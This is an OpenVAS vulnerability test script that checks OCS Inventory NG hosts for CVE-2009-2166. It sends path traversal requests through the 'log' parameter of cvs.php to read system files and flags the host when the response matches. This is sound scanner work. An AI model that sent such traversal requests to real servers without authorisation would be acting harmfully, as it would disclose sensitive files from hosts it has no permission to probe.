###############################################################################
# OpenVAS Vulnerability Test
#
# OCS Inventory NG 'cvs.php' Information Disclosure Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (C) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:ocsinventory-ng:ocs_inventory_ng";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900378");
  script_version("2020-10-06T09:42:44+0000");
  script_tag(name:"last_modification", value:"2020-10-06 09:42:44 +0000 (Tue, 06 Oct 2020)");
  script_tag(name:"creation_date", value:"2009-06-26 07:55:21 +0200 (Fri, 26 Jun 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2009-2166");
  script_name("OCS Inventory NG 'cvs.php' Information Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_ocs_inventory_ng_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ocs_inventory_ng/detected");

  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/8868");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/50946");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause path traversal attack,
  and gain sensitive information.");

  script_tag(name:"affected", value:"OCS Inventory NG version prior to 1.02.1.");

  script_tag(name:"insight", value:"The flaw is due to improper sanitization of user supplied input through the
  'cvs.php' file which can exploited by sending a direct request to the 'log' parameter.");

  script_tag(name:"solution", value:"Upgrade to OCS Inventory NG version 1.02.1 or later.");

  script_tag(name:"summary", value:"This host is running OCS Inventory NG and is prone to Information
  Disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file(keys(files)) {

  url = dir + "/cvs.php?log=/" + files[file];
  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
